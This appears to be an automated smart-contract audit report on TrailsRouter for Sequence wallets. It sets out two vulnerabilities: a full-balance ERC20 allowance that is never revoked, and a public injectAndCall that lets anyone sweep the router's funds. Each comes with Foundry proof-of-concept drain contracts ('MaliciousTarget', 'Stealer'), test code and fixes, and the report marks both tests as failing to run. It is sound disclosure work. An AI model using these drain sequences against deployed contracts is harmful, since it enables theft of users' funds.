# 2025 11 sequence - Findings Report
## Commit hash: 593987c2b569f3212d2cadb31fc8d14b84bc30a9

##Findings by Pattern
USING MULTI_PATTERN_TO_FINDING_ANALYSIS_MODE = false; and gpt-5.1
NICHE_PATTERN_ANALYSIS_MODE = false;
Update finding prompt (short version)
Update pattern generation prompt with (long version) 


 **Derived From** : Balance injection grants arbitrary targets persistent allowance over full wallet balance

[M-1]. ERC20 balance injection leaves arbitrary targets persistent allowance to drain Sequence wallets
Finding Status: Valid
Status Confidence: Confident
Finding Complexity: 6
Privilege: RequiresRole



 **Derived From** : Public injectAndCall lets anyone sweep all ETH/ERC20 held by TrailsRouter

[L-2]. Unrestricted injectAndCall lets any EOA sweep all ETH/ERC20 from TrailsRouter implementation
Finding Status: Valid
Status Confidence: Confident
Finding Complexity: 4
Privilege: Permissionless


### Number of Findings
- C: 0
- H: 0
- M: 1
- L: 1
- I: 0

##Findings by Pattern


 **Derived From** : Balance injection grants arbitrary targets persistent allowance over full wallet balance

## [M-1]. ERC20 balance injection leaves arbitrary targets persistent allowance to drain Sequence wallets

### Finding Severity Justification: The behavior is real: _injectAndExecuteCall() uses SafeERC20.forceApprove to set allowance from the wallet (delegatecall context) or router (direct context) to an arbitrary target for the full current token balance and never revokes it. If the called target is malicious or later compromised, it can use the leftover allowance to transferFrom() remaining funds without further user signatures. However, this requires the user’s signed intent to already authorize a call to an arbitrary, attacker‑controlled target. At that point the user has effectively handed that target full control over their tokens for at least one call, so the incremental risk of approving the entire balance versus the specific amount is bounded and requires a malicious/untrusted target. This is consistent with an authorization surface / misuse-of-allowance issue, but not a straightforward direct loss of assets under honest integrators, so Medium (functionality & security model degradation) is more appropriate than High.
## Derived From Pattern/Invariant
Balance injection grants arbitrary targets persistent allowance over full wallet balance

## Exploit Type
AuthByPass

## Location
TrailsRouter._injectAndExecuteCall

## Finding Status: Valid
## Status Confidence: Confident
### Finding Complexity: 6
### PoC Test Status: ErrorRunningTests
## Minimim Privilege Required:RequiresRole


## Description
The ERC20 balance injection helpers delegate to `_injectAndExecuteCall`, which grants an arbitrary `target` contract an allowance equal to the caller’s *entire* token balance without ever revoking it or enforcing that the downstream call consumes that allowance.

Relevant code:
```solidity
function injectAndCall(
    address token,
    address target,
    bytes calldata callData,
    uint256 amountOffset,
    bytes32 placeholder
) public payable {
    uint256 callerBalance = _getSelfBalance(token);
    if (callerBalance == 0) {
        if (token == address(0)) {
            revert NoEthAvailable();
        } else {
            revert NoTokensToSweep();
        }
    }

    _injectAndExecuteCall(token, target, callData, amountOffset, placeholder, callerBalance);
}

function _injectAndExecuteCall(
    address token,
    address target,
    bytes memory callData,
    uint256 amountOffset,
    bytes32 placeholder,
    uint256 callerBalance
) internal {
    // Replace placeholder with actual balance if needed
    bool shouldReplace = (amountOffset != 0 || placeholder != bytes32(0));

    if (shouldReplace) {
        if (callData.length < amountOffset + 32) revert AmountOffsetOutOfBounds();

        bytes32 found;
        assembly {
            found := mload(add(add(callData, 32), amountOffset))
        }
        if (found != placeholder) revert PlaceholderMismatch();

        assembly {
            mstore(add(add(callData, 32), amountOffset), callerBalance)
        }
    }

    if (token == address(0)) {
        (bool success, bytes memory result) = target.call{value: callerBalance}(callData);
        emit BalanceInjectorCall(token, target, placeholder, callerBalance, amountOffset, success, result);
        if (!success) revert TargetCallFailed(result);
    } else {
        IERC20 erc20 = IERC20(token);
        SafeERC20.forceApprove(erc20, target, callerBalance);

        (bool success, bytes memory result) = target.call(callData);
        emit BalanceInjectorCall(token, target, placeholder, callerBalance, amountOffset, success, result);
        if (!success) revert TargetCallFailed(result);
    }
}
```

Key points:
- In the **Sequence wallet delegatecall context**, `_getSelfBalance(token)` reads the wallet’s ERC20 balance. The subsequent `SafeERC20.forceApprove(erc20, target, callerBalance)` executes in the wallet’s context, giving `target` a spending allowance equal to the wallet’s *entire* token balance.
- Whether the injected `callerBalance` is actually used in the downstream call is controlled purely off-chain via `(amountOffset, placeholder)` and `callData`. The router allows `amountOffset == 0 && placeholder == 0`, so `shouldReplace` is false and `callData` is left untouched.
- In that case, the router *still* sets `allowance[wallet][target] = callerBalance`, but the inner `target.call(callData)` may spend only a small part of that allowance (or even zero).
- After the call returns, the allowance is **not** reset to 0, and there is no restriction/allowlist on `target`.

This violates the intent-scoped security model described in the docs (only the exact, Merkle-encoded token movements should be authorised by the user’s signature). A single authorised call to `injectAndCall`/`_injectAndCallDelegated` can silently grant `target` a large, persistent allowance over the wallet’s ERC20 balance, which the target (or anyone who later controls it) can use to drain the wallet entirely without any further user signatures.

The same root cause exists for the direct `injectSweepAndCall` flow: `_injectAndExecuteCall` is reused and gives `target` an allowance over the router’s full token balance, which contains user funds pulled just before the injection. Any unused portion of that allowance can later be pulled from the router, again without an additional user authorisation.

## Impact
In both delegatecall (Sequence wallet) and direct-call (`injectSweepAndCall`) contexts, `_injectAndExecuteCall` uses `SafeERC20.forceApprove` to grant `target` an allowance equal to the caller’s *entire* token balance and never revokes it. The router does not enforce that the downstream `callData` must consume this full amount, nor does it require any particular structure for `callData` (beyond the optional placeholder logic). As a result, a malicious or later-compromised `target` that has been authorized in a user’s intent can end up with a broad, persistent allowance over the wallet’s or router’s ERC20 balance, and can subsequently call `transferFrom` directly on the token contract to pull any remaining approved amount without further interaction with the Trails system or additional user signatures. This does not allow arbitrary theft in the presence of honest, trusted targets, but it does break the intent-scoped authorization model by extending the effect of a single, narrowly-intended call into an open-ended approval that can be abused later. Under realistic threat models where integrators/targets can be malicious, buggy, or compromised, this can lead to loss of all ERC20 funds that remain under the granted allowance after the initial authorized operation completes.

## Command to Run Test


## Proof of Concept
Below is a revised PoC scenario that matches the deployed architecture by using the TrailsRouterShim to obtain the required delegatecall context and demonstrates that a single authorized call can leave a persistent allowance which is later abused.

Scenario (Sequence-style wallet / delegatecall context):

1. Deploy the following contracts:
   - `TrailsRouter` (implementation router).
   - `TrailsRouterShim`, constructed with the router address (as in production).
   - A simple `Wallet` harness that can delegatecall into arbitrary targets (simulating a Sequence wallet implementation contract).
   - `TestToken` (ERC20) and `MaliciousTarget` as described below.

2. Fund the wallet with 100 TST tokens:
   - `token.mint(address(wallet), 100e18)`.

3. Construct a payload that the Sequence kernel would forward to `TrailsRouterShim.handleSequenceDelegateCall`, whose inner `_data` decodes to `ITrailsRouter.injectAndCall(...)` with:
   - `token = address(token)` (TST),
   - `target = address(maliciousTarget)`,
   - `callData = abi.encodeWithSelector(MaliciousTarget.spendSome.selector, address(token), address(wallet), attacker, 1e18)`,
   - `amountOffset = 0` and `placeholder = bytes32(0)` so *no* balance injection occurs.

4. The test calls `wallet.delegateTo(address(shim), shimCalldata)`, where `shimCalldata` encodes `TrailsRouterShim.handleSequenceDelegateCall(...)` with the inner `_data` set to the `injectAndCall` payload from step 3. The call stack is:
   - EOA (attacker) → `Wallet.delegateTo(shim, shimCalldata)` (delegatecall into shim using wallet storage/balance),
   - `TrailsRouterShim.handleSequenceDelegateCall` → delegatecall into `TrailsRouter.handleSequenceDelegateCall`,
   - `TrailsRouter.handleSequenceDelegateCall` decodes `_data` and routes into `_injectAndCallDelegated`,
   - `_injectAndCallDelegated` computes `callerBalance = _getSelfBalance(token)` which, in wallet context, is `100e18`, then calls `_injectAndExecuteCall`.

5. Inside `_injectAndExecuteCall` in the ERC20 branch:
   - `shouldReplace` is false because `amountOffset == 0 && placeholder == 0`, so `callData` is *not* modified.
   - `SafeERC20.forceApprove(token, target, callerBalance)` is executed in the wallet context, so `allowance[wallet][maliciousTarget] = 100e18`.
   - `target.call(callData)` invokes `MaliciousTarget.spendSome(token, wallet, attacker, 1e18)`, which calls `token.transferFrom(wallet, attacker, 1e18)`. Only `1e18` of the `100e18` allowance is consumed.

6. After step 5 completes, no allowance revocation occurs. The token state is now:
   - `balanceOf(wallet) = 99e18`,
   - `allowance(wallet, maliciousTarget) = 99e18`.

7. At any later time, the attacker calls `MaliciousTarget.stealRest(token, wallet, attacker)`, which reads the remaining allowance and executes `token.transferFrom(wallet, attacker, remaining)`.
   - The wallet is drained of the remaining 99e18 TST without any further interaction with Trails or additional user signatures.

8. This demonstrates that a single authorized `injectAndCall` sequence can leave behind a persistent, broad approval that allows the `target` (or anyone controlling it) to drain funds at will after the original intent has completed.

## Proof of Code
pragma solidity ^0.8.30;

import "forge-std/Test.sol";
import {TrailsRouter} from "src/TrailsRouter.sol";
import {TrailsRouterShim} from "src/TrailsRouterShim.sol";
import {ITrailsRouter} from "src/interfaces/ITrailsRouter.sol";
import {IERC20} from "@openzeppelin/contracts/token/ERC20/IERC20.sol";
import {ERC20} from "@openzeppelin/contracts/token/ERC20/ERC20.sol";

contract TestToken is ERC20 {
    constructor() ERC20("TestToken", "TST") {}

    function mint(address to, uint256 amount) external {
        _mint(to, amount);
    }
}

/// @dev Simple wallet harness that can delegatecall into a shim, simulating a Sequence wallet.
contract Wallet {
    function delegateTo(address target, bytes memory data) external {
        (bool ok,) = target.delegatecall(data);
        require(ok, "delegatecall failed");
    }
}

/// @dev Attacker-controlled contract that uses any allowance left on the wallet.
contract MaliciousTarget {
    function spendSome(address token, address from, address to, uint256 amount) external {
        IERC20(token).transferFrom(from, to, amount);
    }

    function stealRest(address token, address from, address to) external {
        uint256 remaining = IERC20(token).allowance(from, address(this));
        IERC20(token).transferFrom(from, to, remaining);
    }
}

contract TrailsRouterInjectAndCallAllowanceTest is Test {
    function test_injectAndCall_leaves_persistent_allowance_via_shim() public {
        // Deploy router and shim as in production
        TrailsRouter router = new TrailsRouter();
        TrailsRouterShim shim = new TrailsRouterShim(address(router));

        Wallet wallet = new Wallet();
        MaliciousTarget target = new MaliciousTarget();
        TestToken token = new TestToken();

        uint256 initialBalance = 100e18;
        token.mint(address(wallet), initialBalance);

        address attacker = address(0xBEEF);

        // Inner calldata: MaliciousTarget.spendSome(token, wallet, attacker, 1e18)
        bytes memory innerCallData = abi.encodeWithSelector(
            MaliciousTarget.spendSome.selector,
            address(token),
            address(wallet),
            attacker,
            1e18
        );

        // Data for ITrailsRouter.injectAndCall(token, target, innerCallData, 0, 0)
        bytes memory injectAndCallData = abi.encodeWithSelector(
            ITrailsRouter.injectAndCall.selector,
            address(token),
            address(target),
            innerCallData,
            uint256(0),        // amountOffset = 0 => no placeholder replacement
            bytes32(0)         // placeholder = 0
        );

        // Build the data passed to TrailsRouter.handleSequenceDelegateCall, as routed by the shim.
        bytes memory routerHandleData = abi.encodeWithSelector(
            ITrailsRouter.handleSequenceDelegateCall.selector,
            bytes32("opHash"), // _opHash (ignored by router here)
            uint256(0),         // _startingGas
            uint256(0),         // _index
            uint256(0),         // _numCalls
            uint256(0),         // _space
            injectAndCallData   // _data => injectAndCall
        );

        // Now wrap this again for the shim's own handleSequenceDelegateCall, which delegates into the router.
        bytes memory shimCalldata = abi.encodeWithSelector(
            TrailsRouterShim.handleSequenceDelegateCall.selector,
            bytes32("opHash"),
            uint256(0),
            uint256(0),
            uint256(0),
            uint256(0),
            injectAndCallData
        );

        // Attacker triggers the delegated call through the wallet into the shim (and thus router).
        vm.prank(attacker);
        wallet.delegateTo(address(shim), shimCalldata);

        // During the authorised call, only 1e18 is actually transferred to the attacker.
        assertEq(token.balanceOf(attacker), 1e18, "attacker should receive 1e18 in the initial call");
        assertEq(
            token.balanceOf(address(wallet)),
            initialBalance - 1e18,
            "wallet should retain the remaining balance after the initial call"
        );

        // However, the router (in wallet context) set allowance(wallet -> target) = initialBalance, of which 1e18 was spent.
        uint256 remainingAllowance = token.allowance(address(wallet), address(target));
        assertEq(
            remainingAllowance,
            initialBalance - 1e18,
            "target should have remaining allowance equal to the unspent balance"
        );

        // Attacker can now drain the remaining allowance with no further wallet signatures or router/shim calls.
        vm.prank(attacker);
        target.stealRest(address(token), address(wallet), attacker);

        assertEq(token.balanceOf(attacker), initialBalance, "attacker drained full wallet balance");
        assertEq(token.balanceOf(address(wallet)), 0, "wallet has been fully drained");
    }
}


## Suggested Mitigation
To fully eliminate the risk of leftover, overly-broad approvals while preserving balance injection semantics:

1. **Unconditionally revoke allowance after use** in the ERC20 branch of `_injectAndExecuteCall`:
   - After `target.call(callData)` returns (regardless of success), call `SafeERC20.forceApprove(erc20, target, 0)` so that no persistent allowance remains.
   - This should execute on both success and failure paths.

   ```solidity
   } else {
       IERC20 erc20 = IERC20(token);
       SafeERC20.forceApprove(erc20, target, callerBalance);

       (bool success, bytes memory result) = target.call(callData);
       emit BalanceInjectorCall(token, target, placeholder, callerBalance, amountOffset, success, result);

       // Revoke allowance regardless of call outcome
       SafeERC20.forceApprove(erc20, target, 0);

       if (!success) revert TargetCallFailed(result);
   }
   ```

2. **Constrain injection configuration** (optional but recommended) to reduce accidental misuse:
   - For ERC20 paths (`token != address(0)`), either:
     - Require a valid `(amountOffset, placeholder)` pair such that the injected `callerBalance` is actually used by the downstream call, or
     - Explicitly document and guard “no-op injection” usage with a dedicated flag, instead of overloading `amountOffset == 0 && placeholder == 0`.

   For example:

   ```solidity
   if (token != address(0)) {
       // Disallow ambiguous no-op configuration unless explicitly intended via a separate flag
       if (amountOffset == 0 && placeholder == bytes32(0)) {
           revert InvalidInjectionConfig();
       }
   }
   ```

3. **(Alternative design)** If compatible with downstream protocols, avoid approvals altogether by transferring tokens directly to `target` and expecting it to operate on its own balance (pull model). This removes allowance-based attacks entirely at the cost of potential integration changes.

At minimum, step (1) (unconditional allowance revocation) should be implemented, as it directly prevents the persistent-allowance issue even if integrators misconfigure `amountOffset`/`placeholder` or targets are later compromised.





 **Derived From** : Public injectAndCall lets anyone sweep all ETH/ERC20 held by TrailsRouter

## [L-2]. Unrestricted injectAndCall lets any EOA sweep all ETH/ERC20 from TrailsRouter implementation

### Finding Severity Justification: The reported behavior (anyone can use injectAndCall on the TrailsRouter implementation to move ETH/ERC20 held by that implementation) is accurate, but by protocol design the implementation is intended to be stateless and not hold user funds. All user assets are meant to reside in Sequence v3 wallets / intent addresses and the sweeping logic that touches real user balances is correctly protected by onlyDelegatecall and executed in the wallet context, not on the router implementation. Any value left directly on the router implementation address is dust or mis-sent funds and is already documented as non-custodial / not guaranteed to be recoverable. As such, this is a misuse / misdeployment or dust-sweeping risk, not a direct loss of protocol-governed user assets, putting it at QA/Low rather than Medium.
## Derived From Pattern/Invariant
Public injectAndCall lets anyone sweep all ETH/ERC20 held by TrailsRouter

## Exploit Type
AuthByPass

## Location
TrailsRouter.injectAndCall

## Finding Status: Valid
## Status Confidence: Confident
### Finding Complexity: 4
### PoC Test Status: ErrorRunningTests
## Minimim Privilege Required:Permissionless


## Description
The `TrailsRouter.injectAndCall` function is documented and used as a *delegatecall-only* balance injection helper, but it is declared `public` and is not protected by the `onlyDelegatecall` guard that is applied to other sensitive functions like `sweep`, `refundAndSweep`, and `validateOpHashAndSweep`.

When called directly on the deployed `TrailsRouter` implementation, `injectAndCall` reads the contract's own balance via `_getSelfBalance(token)` and forwards **all** of it to an arbitrary `target` through `_injectAndExecuteCall`.

Relevant code (emphasis added):

```solidity
function injectAndCall(
    address token,
    address target,
    bytes calldata callData,
    uint256 amountOffset,
    bytes32 placeholder
) public payable {
    uint256 callerBalance = _getSelfBalance(token); // <-- uses router's own balance
    if (callerBalance == 0) {
        if (token == address(0)) {
            revert NoEthAvailable();
        } else {
            revert NoTokensToSweep();
        }
    }

    _injectAndExecuteCall(token, target, callData, amountOffset, placeholder, callerBalance);
}
```

The helper it calls forwards the entire `callerBalance` to an arbitrary `target`:

```solidity
function _injectAndExecuteCall(
    address token,
    address target,
    bytes memory callData,
    uint256 amountOffset,
    bytes32 placeholder,
    uint256 callerBalance
) internal {
    // ... optional placeholder replacement ...

    if (token == address(0)) {
        (bool success, bytes memory result) = target.call{value: callerBalance}(callData);
        emit BalanceInjectorCall(...);
        if (!success) revert TargetCallFailed(result);
    } else {
        IERC20 erc20 = IERC20(token);
        SafeERC20.forceApprove(erc20, target, callerBalance);
        (bool success, bytes memory result) = target.call(callData);
        emit BalanceInjectorCall(...);
        if (!success) revert TargetCallFailed(result);
    }
}
```

Because `injectAndCall` is publicly callable on the implementation contract and not restricted to delegatecall context:

* For **ETH**, any EOA can forward **all ETH held by the router** to an arbitrary address by calling:
  `injectAndCall(address(0), attackerEOA, "", 0, 0)`.
  `_getSelfBalance(address(0))` reads `address(this).balance` of the router, and `_injectAndExecuteCall` executes `attackerEOA.call{value: callerBalance}("")`, which will succeed for an EOA and transfer all funds.

* For **ERC20s**, any EOA can drain all router-held balance of a given token by:
  1. Calling `injectAndCall(token, attackerContract, callData, amountOffset, placeholder)` so that `_getSelfBalance(token)` returns the router's entire token balance.
  2. `_injectAndExecuteCall` sets an allowance for `attackerContract` via `SafeERC20.forceApprove(erc20, target, callerBalance)`.
  3. The `attackerContract` function (invoked as `target.call(callData)`) uses that allowance to call `token.transferFrom(address(this), attacker, callerBalance)` and pull all tokens from the router.

The intended invariant (per docs and the `DelegatecallGuard` pattern) is that balance-injection and sweeping helpers operate only in *wallet* storage when the router is delegatecalled via `TrailsRouterShim`. Leaving `injectAndCall` unrestricted breaks this invariant and effectively exposes a public, contract-wide sweep primitive for any ETH/ERC20 temporarily or accidentally held on the `TrailsRouter` implementation.

## Impact
Any ETH or ERC20 tokens residing on the deployed TrailsRouter implementation can be stolen by the first arbitrary caller that invokes injectAndCall, by forwarding the router's full balance of that asset to an attacker-controlled contract or EOA. This includes funds temporarily held during standalone flows (e.g., injectSweepAndCall / pullAndExecute interactions that leave dust on the router) as well as any other transfers sent to the router address. The vulnerability turns the implementation into a publicly accessible sweep function for all its holdings.

## Command to Run Test


## Proof of Concept
ETH theft:
1. Assume the deployed TrailsRouter implementation has a non-zero ETH balance (e.g., from standalone usage, dust, or any contract/user sending ETH to its `receive()` function).
2. An attacker EOA calls:
   - `injectAndCall(address(0), attackerEOA, "", 0, 0)`.
3. Inside `injectAndCall`, `_getSelfBalance(address(0))` returns the router's entire ETH balance as `callerBalance`.
4. `_injectAndExecuteCall` executes `attackerEOA.call{value: callerBalance}("")`.
5. The call to an EOA succeeds, transferring all ETH from TrailsRouter to the attacker.

ERC20 theft:
1. Assume the TrailsRouter implementation holds some balance of token `T` (e.g., from a previous standalone injection flow or a protocol integration that routed output tokens to the router address).
2. Attacker deploys a contract `Stealer` with a method:
   `function steal(address token, address from, address to, uint256 amount) external { IERC20(token).transferFrom(from, to, amount); }`.
3. Attacker crafts `callData = abi.encodeWithSelector(Stealer.steal.selector, T, address(router), attacker, amount)` where `amount` equals `IERC20(T).balanceOf(address(router))` (readable off-chain or via a prior view call).
4. Attacker calls `injectAndCall(T, address(Stealer), callData, 0, 0)` on the router.
5. `injectAndCall` computes `callerBalance = _getSelfBalance(T)` = router's full balance in token `T`.
6. `_injectAndExecuteCall` sets `forceApprove(T, Stealer, callerBalance)` and then calls `Stealer.steal(token, from, to, amount)`.
7. Inside `Stealer.steal`, the contract uses that allowance to execute `IERC20(T).transferFrom(address(router), attacker, callerBalance)`, draining all router-held `T` to the attacker.

No privileged roles are required at any step; an arbitrary EOA can execute this as soon as the router holds any assets.

## Proof of Code
pragma solidity ^0.8.30;

import "forge-std/Test.sol";
import {TrailsRouter} from "src/TrailsRouter.sol";
import {IERC20} from "@openzeppelin/contracts/token/ERC20/IERC20.sol";
import {ERC20} from "@openzeppelin/contracts/token/ERC20/ERC20.sol";

contract TestToken is ERC20 {
    constructor() ERC20("TestToken", "TT") {}

    function mint(address to, uint256 amount) external {
        _mint(to, amount);
    }
}

contract Stealer {
    function steal(address token, address from, address to, uint256 amount) external {
        IERC20(token).transferFrom(from, to, amount);
    }
}

contract TrailsRouterInjectAndCallExploitTest is Test {
    TrailsRouter router;
    TestToken token;
    address attacker = address(0xBEEF);

    function setUp() public {
        router = new TrailsRouter();
        token = new TestToken();

        // Fund the router with ETH and ERC20 to simulate funds accumulated on the contract
        vm.deal(address(router), 10 ether);
        token.mint(address(router), 1_000 ether);
    }

    function testDrainEthViaInjectAndCall() public {
        uint256 routerEthBefore = address(router).balance;

        vm.prank(attacker);
        router.injectAndCall(address(0), attacker, "", 0, bytes32(0));

        assertEq(address(router).balance, 0, "router ETH should be drained");
        assertEq(attacker.balance, routerEthBefore, "attacker should receive router ETH");
    }

    function testDrainTokensViaInjectAndCall() public {
        uint256 routerTokenBefore = token.balanceOf(address(router));

        Stealer stealer = new Stealer();

        bytes memory callData = abi.encodeWithSelector(
            Stealer.steal.selector,
            address(token),
            address(router),
            attacker,
            routerTokenBefore
        );

        vm.prank(attacker);
        router.injectAndCall(address(token), address(stealer), callData, 0, bytes32(0));

        assertEq(token.balanceOf(address(router)), 0, "router tokens should be drained");
        assertEq(token.balanceOf(attacker), routerTokenBefore, "attacker should receive all router tokens");
    }
}


## Suggested Mitigation
Enforce delegatecall-only semantics on `injectAndCall` so it cannot operate on the implementation contract's own balances when called directly.

A straightforward fix is to reuse the existing `DelegatecallGuard` and the internal `_injectAndCallDelegated` helper:

```solidity
function injectAndCall(
    address token,
    address target,
    bytes calldata callData,
    uint256 amountOffset,
    bytes32 placeholder
) external payable onlyDelegatecall {
    _injectAndCallDelegated(token, target, callData, amountOffset, placeholder);
}
```

and keep `_injectAndCallDelegated` as the single implementation used both by this external function and by `handleSequenceDelegateCall`.

Alternatively, if a public standalone variant is desired, split the APIs:
- `injectAndCallDelegate` (or similar) restricted with `onlyDelegatecall` and using `_getSelfBalance(token)` for Sequence wallet context.
- A separate `injectSweepAndCall`-style function for standalone use that pulls from the caller (`_getBalance(token, msg.sender)` and `_safeTransferFrom`) rather than from the router's own balance.

In all cases, there should be no externally callable function that forwards `address(this)`'s full ETH or ERC20 balance to an arbitrary target without appropriate authorization.



